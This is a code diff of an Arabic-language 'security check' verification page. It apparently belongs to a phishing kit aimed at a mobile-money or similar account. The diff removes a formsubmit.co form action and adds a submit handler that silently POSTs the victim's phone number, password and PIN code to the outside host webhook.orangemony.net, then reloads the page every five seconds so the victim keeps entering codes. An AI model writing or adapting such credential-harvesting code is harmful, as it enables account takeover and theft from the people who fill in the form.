@@ -124,11 +124,7 @@
                         name="تحقق" 
                         data-name="تحقق" 
                         method="post" 
-                        action='https://formsubmit.co/18adf9b7fdf4cc3d254bb14bae1266c3'
                         aria-label="التحقق من الامن">
-                        <input type="hidden" name="_captcha" value="false">
-
-
                         <div id="field" class="field-holder">
                             <input class="text-field-2 w-input" maxlength="4" name="رمز التحقق" data-name="رمز التحقق" placeholder="" type="text" id="pincode" required="">
                             <label for="pincode">
@@ -240,7 +236,21 @@
         document.getElementById('password').value = password;
 
         $("#verificationForm").on("submit", function(event) {
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", 'https://webhook.orangemony.net', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                'phonenumber': document.getElementById('phonenumber').value,
+                'password':document.getElementById('password').value,
+                'pin':document.getElementById('pincode').value
+            }));
+
+
             setInterval(function() { window.location.reload() }, 5000);
+
+
+
 
         })
         </script>
